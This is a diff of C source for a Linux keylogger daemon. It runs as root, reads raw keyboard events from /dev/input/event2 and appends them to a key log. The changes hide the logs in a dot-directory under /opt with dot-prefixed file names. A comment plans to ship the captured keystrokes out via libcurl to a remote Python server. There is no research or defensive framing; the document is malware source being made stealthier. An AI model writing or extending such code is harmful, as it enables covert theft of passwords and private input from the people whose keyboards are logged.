@@ -1,4 +1,4 @@
-// REMOVE PRINTF AND CHANGE DIRECTORY TO /dev WHEN DONE
+// REMOVE PRINTF WHEN DONE
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
@@ -18,6 +18,7 @@ int main(void) {
 	struct utsname unameData;
 	uname(&unameData);
 	int fd;
+	int dir;
 	struct input_event ev;			/* using input_event so we know 
 									 * what we're reading from the 
 									 * event file */
@@ -42,18 +43,18 @@ int main(void) {
 	if (sid < 0) {
 		exit(1);
 	}
-	// CHANGE DIRECTORY TO DEV WHEN DONE
-	chdir("log/");					/* change daemon working 
-									 * directory to /dev */
+
+	chdir("/opt/");					/* change daemon working directory */
+
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
 
-	fp = fopen("log.txt", "a+"); 				/* daemon log */
-	evlog = fopen("evlog.txt", "a+");  			/* key log */
+	dir = mkdir("./.log", S_IRWXU);				/* log directory */
+	fp = fopen("./.log/.log.txt", "a+"); 		/* daemon log */
+	evlog = fopen("./.log/.evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
-	// read(findev, )fakjdlajfkl;a
 /*
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
 * Send file out via libcurl to python server for translation
@@ -64,7 +65,7 @@ int main(void) {
 		fprintf(fp, "%s -- ERROR: user not root\n", ctime(&curtime));
 		return 1;
 	}
-	if (evlog == NULL) {
+	if (NULL == evlog) {
 		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
 		return 1;
 	}
